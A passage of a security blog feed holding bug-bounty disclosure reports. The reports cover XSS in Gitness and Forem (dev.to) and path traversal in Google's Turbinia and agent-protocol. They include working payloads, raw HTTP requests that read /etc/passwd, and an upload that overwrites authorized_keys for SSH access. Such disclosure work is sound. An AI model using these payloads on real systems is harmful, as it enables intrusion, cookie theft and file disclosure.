    <p>Open <code class="language-plaintext highlighter-rouge">Pull Requests</code> section, create new pull request, set base to <code class="language-plaintext highlighter-rouge">main</code> branch and compare to <code class="language-plaintext highlighter-rouge">branch2</code> branch. In <code class="language-plaintext highlighter-rouge">Description</code> markdown editor, send payload <code class="language-plaintext highlighter-rouge">&lt;iframe srcdoc="&lt;script&gt;alert(document.cookie)&lt;/script&gt;"&gt;&lt;/iframe&gt;</code>, and press the button <code class="language-plaintext highlighter-rouge">create pull request</code>. After creating the pr, an alert should pop up.</p>
  </li>
</ol>

<p><img src="/assets/images/bughunter/gitness/pr1.png" alt="branch" /></p>

<p><img src="/assets/images/bughunter/gitness/alert.png" alt="branch" /></p>

<h2 id="impact">Impact</h2>

<p>Anyone who is capable to comment on pr or create pr can post a comment on a public project pull requests and injecting the xss.</p>

<h2 id="reference">Reference</h2>

<p><a href="https://github.com/uiwjs/react-markdown-preview?tab=readme-ov-file#security">https://github.com/uiwjs/react-markdown-preview?tab=readme-ov-file#security</a></p>

<p>FIX:
<a href="https://github.com/harness/gitness/commit/49f3bf151e89d59bad60b3d41b1341d7c5b66b17">https://github.com/harness/gitness/commit/49f3bf151e89d59bad60b3d41b1341d7c5b66b17</a></p>

<h2 id="occurrences">Occurrences</h2>

<p><a href="https://github.com/harness/gitness/blob/e31f33addea310b28a21ad1e05ab661acd163ef8/web/src/components/MarkdownViewer/MarkdownViewer.tsx#L141">https://github.com/harness/gitness/blob/e31f33addea310b28a21ad1e05ab661acd163ef8/web/src/components/MarkdownViewer/MarkdownViewer.tsx#L141</a></p>]]></content><author><name></name></author><category term="xss" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">Google: Local File Inclusion in Turbinia API Server</title><link href="http://0.0.0.0:4000/file-overwrite/2024/05/08/local-file-inclusion-in-turbinia.html" rel="alternate" type="text/html" title="Google: Local File Inclusion in Turbinia API Server" /><published>2024-05-08T10:31:06+08:00</published><updated>2024-05-08T10:31:06+08:00</updated><id>http://0.0.0.0:4000/file-overwrite/2024/05/08/local-file-inclusion-in-turbinia</id><content type="html" xml:base="http://0.0.0.0:4000/file-overwrite/2024/05/08/local-file-inclusion-in-turbinia.html"><![CDATA[<h2 id="name">Name</h2>

<blockquote>
  <p>Local File Inclusion in Turbinia API Server</p>
</blockquote>

<h2 id="weakness">Weakness</h2>

<blockquote>
  <p>CWE-22: Path Traversal</p>
</blockquote>

<h2 id="severity">Severity</h2>

<blockquote>
  <p>High (8.8)</p>
</blockquote>

<h2 id="description">Description</h2>

<p>A local file inclusion is present in the Turbinia API Server when requesting resource files under the <code class="language-plaintext highlighter-rouge">/assets/{catchall:path}</code> route.</p>

<h2 id="proof-of-concept">Proof of Concept</h2>

<p>The <a href="https://github.com/google/turbinia/blob/1da2d19f9b79dac8df37bdf2ed4f9d5d0797607b/turbinia/api/routes/ui.py#L47">route</a> <code class="language-plaintext highlighter-rouge">/assets/{catchall:path}</code> is used for serving CSS and JS resources for Turbinia Web service. The <code class="language-plaintext highlighter-rouge">catchall</code> parameter in url is not sanitized before appended to base path, an attacker can use <code class="language-plaintext highlighter-rouge">../</code> to escape base directory and locate any file on system which will be sent back to the attacker, causing local file inclusion issue.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>@ui_router.get(
    '/assets/{catchall:path}', name='assets', include_in_schema=False)
async def serve_assets(request: Request):
  """Serves assets content."""
  static_content_path = pathlib.Path(_config.WEBUI_PATH).joinpath('dist/assets')
  path = request.path_params['catchall']
  file = static_content_path.joinpath(path)
  if os.path.exists(file):
    return FileResponse(file)

  raise HTTPException(status_code=404, detail='Not found')
</code></pre></div></div>

<h3 id="steps-to-reproduce">Steps to reproduce</h3>

<p>Following official <a href="https://turbinia.readthedocs.io/en/latest/user/install.html#docker-installation">docker tutorial</a> to set up the Turbinia service:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git clone https://github.com/google/turbinia.git
cd turbinia
mkdir -p ./conf &amp;&amp; mkdir -p ./tmp &amp;&amp; mkdir -p ./evidence &amp;&amp; mkdir -p ./certs &amp;&amp; chmod 777 ./conf ./tmp ./evidence ./certs
sed -f docker/local/local-config.sed turbinia/config/turbinia_config_tmpl.py &gt; conf/turbinia.conf
</code></pre></div></div>
<p>Then, edit the <code class="language-plaintext highlighter-rouge">./docker/local/docker-compose.yml</code>, in <code class="language-plaintext highlighter-rouge">turbinia-api-server</code> section, expose Turbinia API Server port <code class="language-plaintext highlighter-rouge">8000</code> to host mechine by adding <code class="language-plaintext highlighter-rouge">ports: - "8000:8000"</code>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>...
turbinia-api-server:
        #image: "turbinia-api-server-dev" # Use this for local development and comment out below line
        image: "us-docker.pkg.dev/osdfir-registry/turbinia/release/turbinia-api-server:latest" # Latest stable
        container_name: turbinia-api-server
        depends_on:
            - redis
        volumes:
            - $PWD/evidence:/evidence
            - $PWD/conf/turbinia.conf:/etc/turbinia/turbinia.conf
        environment:
            - LC_ALL=C.UTF-8
            - LANG=C.UTF-8
            - TURBINIA_EXTRA_ARGS=${TURBINIA_EXTRA_ARGS}
        expose:
            - "8000"
        ports:
            - "8000:8000"
...
</code></pre></div></div>
<p>Finally, bring up the local Turbinia stack:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>docker-compose -f ./docker/local/docker-compose.yml up
</code></pre></div></div>

<p>After service up, the Turbinia API Server will listen on <code class="language-plaintext highlighter-rouge">http://127.0.0.1:8000</code>. Open the webpage <code class="language-plaintext highlighter-rouge">http://127.0.0.1:8000</code> in browser and intecept requests using burp suite or chrome devtools. We can capture following request:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET http://127.0.0.1:8000/assets/index-a76ac6aa.js HTTP/1.1
Accept: */*
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,ja-JP;q=0.6,ja;q=0.5
Cache-Control: no-cache
Cookie: fakesession=hello
Origin: http://0.0.0.0:8000
Pragma: no-cache
Referer: http://0.0.0.0:8000/web
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
Postman-Token: 0ee2337d-af8f-4873-afd8-91a9c27897b1
Host: 127.0.0.1:8000
Accept-Encoding: gzip, deflate
Connection: close
</code></pre></div></div>

<p>Modify the request by change <code class="language-plaintext highlighter-rouge">index-a76ac6aa.js</code> part to <code class="language-plaintext highlighter-rouge">..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd</code> which is <code class="language-plaintext highlighter-rouge">../../../../../../etc/passwd</code> url-encoded content.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET http://127.0.0.1:8000/assets/..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd HTTP/1.1
Accept: */*
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,ja-JP;q=0.6,ja;q=0.5
Cache-Control: no-cache
Cookie: fakesession=hello
Origin: http://0.0.0.0:8000
Pragma: no-cache
Referer: http://0.0.0.0:8000/web
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
Postman-Token: 0ee2337d-af8f-4873-afd8-91a9c27897b1
Host: 127.0.0.1:8000
Accept-Encoding: gzip, deflate
Connection: close
</code></pre></div></div>

<p>Or just open link: <code class="language-plaintext highlighter-rouge">http://127.0.0.1:8000/assets/..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd</code> in browser.</p>

<p>The output is the contents of the <code class="language-plaintext highlighter-rouge">/etc/passwd</code> file:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
turbinia:x:999:999::/home/turbinia:/sbin/nologin
</code></pre></div></div>

<p><img src="/assets/cve/Turbinia.png" alt="Turbinia" /></p>

<h2 id="impact">Impact</h2>

<p>Any file on the backend filesystem can be read by an attacker with access to the Turbinia API Server website.</p>

<h2 id="reference">Reference</h2>

<p><a href="https://huntr.com/bounties/29ec621a-bd69-4225-ab0f-5bb8a1d10c67">https://huntr.com/bounties/29ec621a-bd69-4225-ab0f-5bb8a1d10c67</a></p>

<h2 id="occurrences">Occurrences</h2>

<p><a href="https://github.com/google/turbinia/blob/1da2d19f9b79dac8df37bdf2ed4f9d5d0797607b/turbinia/api/routes/ui.py#L53">https://github.com/google/turbinia/blob/1da2d19f9b79dac8df37bdf2ed4f9d5d0797607b/turbinia/api/routes/ui.py#L53</a></p>]]></content><author><name></name></author><category term="file-overwrite" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">Dev.to(Forem) cta xss</title><link href="http://0.0.0.0:4000/xss/2024/04/30/xss-devto.html" rel="alternate" type="text/html" title="Dev.to(Forem) cta xss" /><published>2024-04-30T10:26:18+08:00</published><updated>2024-04-30T10:26:18+08:00</updated><id>http://0.0.0.0:4000/xss/2024/04/30/xss-devto</id><content type="html" xml:base="http://0.0.0.0:4000/xss/2024/04/30/xss-devto.html"><![CDATA[<h2 id="name">Name</h2>

<blockquote>
  <p>Dev.to(Forem) cta xss</p>
</blockquote>

<h2 id="weakness">Weakness</h2>

<blockquote>
  <p>XSS</p>
</blockquote>

<h2 id="severity">Severity</h2>
<blockquote>
  <p>Medium</p>
</blockquote>

<h2 id="summary">Summary</h2>

<p>DEV is a community of software developers which is built on <a href="https://github.com/forem">Forem</a>: open source software designed to empower communities. You can edit your blog with its buildin markdown editor using liquid markdown syntax.</p>

<p>For example, <a href="https://dev.to/devteam/lesser-known-features-of-dev-embedding-call-to-action-cta-buttons-2gni">CTA</a> uses 
<code class="language-plaintext highlighter-rouge">{% cta link %} desc {% endcta %}</code>
 to create a button with a link to jump to. However, the backend didnâ€™t sanitize <code class="language-plaintext highlighter-rouge">javascript</code> link, causing click xss.</p>

<h4 id="trigger">Trigger</h4>
<ol>
  <li>
    <p>Create a post or comment, in the editor, send following payload:</p>

    <p><code class="language-plaintext highlighter-rouge">{% cta javascript:alert(document.domain) %} clickme {% endcta %}</code></p>

    <p><img src="/assets/images/bughunter/dev1.png" alt="dev1" /></p>

    <p><img src="/assets/images/bughunter/dev-com1.png" alt="dev1" /></p>
  </li>
  <li>
    <p>After payload sent, a button is rendered, click the button, the xss is triggered!</p>

    <p><img src="/assets/images/bughunter/dev2.png" alt="dev2" /></p>

    <p><img src="/assets/images/bughunter/dev3.png" alt="dev3" /></p>

    <p><img src="/assets/images/bughunter/dev-com2.png" alt="dev2" /></p>

    <p><img src="/assets/images/bughunter/dev-com3.png" alt="dev3" /></p>
  </li>
  <li>
    <p>Using chrome dev tools to check the rendered result:</p>

    <p><img src="/assets/images/bughunter/dev-com4.png" alt="dev4" /></p>
  </li>
</ol>

<h3 id="root-cause">Root cause</h3>

<p>Forem codebase:</p>

<p><a href="https://github.com/forem/forem/blob/7c3e5b2b999f3cc830b02a2ec21735cc464bf16d/app/views/liquids/_cta.html.erb#L1">_cta.html.erb</a></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;a href="&lt;%= link %&gt;" class="ltag_cta ltag_cta--&lt;%= type %&gt;" role="button"&gt;&lt;%= description %&gt;&lt;/a&gt;
</code></pre></div></div>

<p><a href="https://github.com/forem/forem/blob/7c3e5b2b999f3cc830b02a2ec21735cc464bf16d/app/liquid_tags/cta_tag.rb#L21">render cta_tag</a></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def render(_context)
    content = Nokogiri::HTML.parse(super)

    ApplicationController.render(
      partial: PARTIAL,
      locals: {
        link: @link,
        description: sanitized_description(content),
        type: TYPE_OPTIONS.first
      },
    )
  end
</code></pre></div></div>]]></content><author><name></name></author><category term="xss" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">Remote Code Execution via Arbitrary File Overwrite Using Path Traversal in agent-protocol</title><link href="http://0.0.0.0:4000/file-overwrite/2024/04/10/remote-code-execution-via-afo-using-path-traversal-in-agent-protol.html" rel="alternate" type="text/html" title="Remote Code Execution via Arbitrary File Overwrite Using Path Traversal in agent-protocol" /><published>2024-04-10T10:31:06+08:00</published><updated>2024-04-10T10:31:06+08:00</updated><id>http://0.0.0.0:4000/file-overwrite/2024/04/10/remote-code-execution-via-afo-using-path-traversal-in-agent-protol</id><content type="html" xml:base="http://0.0.0.0:4000/file-overwrite/2024/04/10/remote-code-execution-via-afo-using-path-traversal-in-agent-protol.html"><![CDATA[<h2 id="name">Name</h2>

<blockquote>
  <p>Remote Code Execution via Arbitrary File Overwrite Using Path Traversal in agent-protocol</p>
</blockquote>

<h2 id="weakness">Weakness</h2>

<blockquote>
  <p>CWE-22: Path Traversal</p>
</blockquote>

<h2 id="severity">Severity</h2>

<blockquote>
  <p>High (8.8)</p>
</blockquote>

<h2 id="description">Description</h2>

<p>The <code class="language-plaintext highlighter-rouge">/ap/v1/agent/tasks//artifacts</code> endpoint in the agent-protocol python API is vulnerable to a path traversal vulnerability through the <code class="language-plaintext highlighter-rouge">filename</code> parameter which allows the uploading of arbitrary files. An attacker can upload and overwrite ANY file on the filesystem. This can lead to remote code execution in many different ways.</p>

<h2 id="proof-of-concept">Proof of Concept</h2>

<p>In this proof of concept, we will be gaining remote code execution by uploading our SSH key to the <code class="language-plaintext highlighter-rouge">authorized_keys</code> file. There are many other ways to achieve remote code execution via a file upload, such as overwriting binaries, writing to .bashrc, â€¦.</p>

<p>We proof this vulnerability by logging into the <code class="language-plaintext highlighter-rouge">kali</code> user running the agent-protocol python API and checking that at this moment the <code class="language-plaintext highlighter-rouge">/home/kali/.ssh/authorized_keys</code> file does not exist.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@fc7d9ff6a411:/# cat /home/kali/.ssh/authorized_keys
cat: /home/kali/.ssh/authorized_keys: No such file or directory
</code></pre></div></div>

<p>An attacker can now send the following request to the webserver. This request will upload the attackerâ€™s public RSA key to the <code class="language-plaintext highlighter-rouge">authorized_keys</code> file.</p>

<p>We start a simple server using example from <a href="https://github.com/AI-Engineer-Foundation/agent-protocol/blob/52960383f4adca11061bd39358c5933df7eb8b24/packages/sdk/python/examples/minimal.py">https://github.com/AI-Engineer-Foundation/agent-protocol/blob/52960383f4adca11061bd39358c5933df7eb8b24/packages/sdk/python/examples/minimal.py</a>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>from agent_protocol import Agent, Task, Step

async def task_handler(task: Task) -&gt; None:
    print(f"task: {task.input}")
    await Agent.db.create_step(task.task_id, task.input)

async def step_handler(step: Step) -&gt; Step:
    print(f"step: {step.input}")
    await Agent.db.create_step(step.task_id, f"Next step from step {step.name}")
    step.output = step.input
    return step

Agent.setup_agent(task_handler, step_handler).start()
</code></pre></div></div>
<p>Start server:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python mimimal.py
</code></pre></div></div>

<p>Then, create a task and get taskid:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST http://127.0.0.1:8000/ap/v1/agent/tasks HTTP/1.1
Content-Type: application/json
User-Agent: PostmanRuntime/7.37.0
Accept: */*
Postman-Token: 6d1b6f21-1923-4517-9073-6097d87e9668
Host: 127.0.0.1:8000
Accept-Encoding: gzip, deflate
Connection: close
Content-Length: 61

{
    "input": "test"
}
</code></pre></div></div>

<p>Using taskid we created and upload <code class="language-plaintext highlighter-rouge">authorized_keys</code> file, set filename to <code class="language-plaintext highlighter-rouge">../../../../../../../../../home/kali/.ssh/authorized_keys</code></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST http://127.0.0.1:8000/ap/v1/agent/tasks/91225126-2e71-42c2-9389-edbe4dd16d31/artifacts HTTP/1.1
Content-Type: multipart/form-data; boundary=--------------------------590741319467185743628097
User-Agent: PostmanRuntime/7.37.0
Accept: */*
Postman-Token: 591713fe-b29e-4e94-b467-f8989f921b54
Host: 127.0.0.1:8000
Accept-Encoding: gzip, deflate
Connection: close
Content-Length: 2368

----------------------------590741319467185743628097
Content-Disposition: form-data; name="file"; filename="../../../../../../../../../home/kali/.ssh/authorized_keys"
Content-Type: application/javascript

ssh-rsa AAAAB3NzaC1yc2EAAAADAR0AgOOiNtyaS9q8ObZhZmfDzcpIdDr14J83LRPJJ1ht1wFs+fXJwShzuXM7RtnKMu0cf3dN1iLbZeuwvgegowBI8iUoF9QR/k8QNSHEmnk4ZbN6WzgoQeeVc/I3C6PyD/4afMsQRU6fzij8BwDIHcQccEKsDvJ/xvDZXEbn2I5XIlPUAzYwslk= 11593@samurai
----------------------------590741319467185743628097--
</code></pre></div></div>

<p>The response indicates success with artifact file path.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 200 
Content-Length: 169
Connection: keep-alive
Content-Type: application/json
Date: Wed, 10 Apr 2024 06:38:25 GMT
Keep-Alive: timeout=4
Proxy-Connection: keep-alive
Server: hypercorn-h11

{"artifact_id":"65c004cd-e7cf-4d4b-8009-cc775889c86e","agent_created":false,"file_name":"../../../../../../../../../home/kali/.ssh/authorized_keys","relative_path":null}
</code></pre></div></div>

<p>We can verify the success by again checking the /home/kali/.ssh/authorized_keys file.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@fc7d9ff6a411:/# cat /home/kali/.ssh/authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDb+p1vHNh3CdWiOt+1DDptHOL+Rs7/YeRmjALSIqEMw2XUXG7+dRpSKc7VNT+DaliwSUIU0KPIacKQsMq9sLE/rPmtKYSuNBUhF2LccqjtUkri/lWZjLvJUyidFeAc7jabbG2JvuMzxbAMy4uxYGHQm+4MuGymeBJIyYKaUa9fuMHE2UNqGkvANgh6WLdEGTpPf52rHPnhab6PRd5DzYDJxk/W0Lci+BSUDi+8b5xSxX6GMRTn74zy6AnyktP5+xmnetlkHxAEGLBppE9bInIsc/feCqXiH7Eeq6t8WR0AgOOiNtyaS9q8ObZhZmfDzcpIdDr14J83LRPJJ1ht1wFs+fXJwShzuXM7RtnKMu0cf3dN1iLbZeuwvgtOBQDLRa6AxN5JxskvY+hP3Tsz3FUf5TA9ckegowBI8iUoF9QR/k8QNSHEmnk4ZbN6WzgoQeeVc/I3C6PyD/4afMsQRU6fzij8BwDIHcQccEKsDvJ/xvDZXEbn2I5XIlPUAzYwslk= 11593@samurai
</code></pre></div></div>

<h2 id="impact">Impact</h2>

<p>This vulnerability can have severe consequences. This section will highlight some tangible impact.</p>

<p>Warning: this bug also affects <a href="https://github.com/smol-ai/developer">smol.ai</a></p>

<h3 id="ssh-access">SSH Access</h3>

<p>On servers that have SSH enabled, an attacker may be able to inject their own public RSA key into the authorized_keys file, leading to remote code execution.</p>

<h3 id="web-servers">Web Servers</h3>

<p>On servers hosting web servers, various vulnerabilities can be exploited. On PHP or JSP server, remote code execution may be possible via uploading a webshell. On other servers an HTML file can be uploaded to achieve Cross-site Scripting (XSS)</p>

<h2 id="reference">Reference</h2>

<p><a href="https://huntr.com/bounties/6be8d4e3-67e6-4660-a8db-04215a1cff3e">https://huntr.com/bounties/6be8d4e3-67e6-4660-a8db-04215a1cff3e</a></p>

<h2 id="occurrences">Occurrences</h2>

<p><a href="https://github.com/AI-Engineer-Foundation/agent-protocol/blob/52960383f4adca11061bd39358c5933df7eb8b24/packages/sdk/python/agent_protocol/agent.py#L188C49-L188C58">https://github.com/AI-Engineer-Foundation/agent-protocol/blob/52960383f4adca11061bd39358c5933df7eb8b24/packages/sdk/python/agent_protocol/agent.py#L188C49-L188C58</a></p>]]></content><author><name></name></author><category term="file-overwrite" /><summary type="html"><![CDATA[Name]]></summary></entry></feed>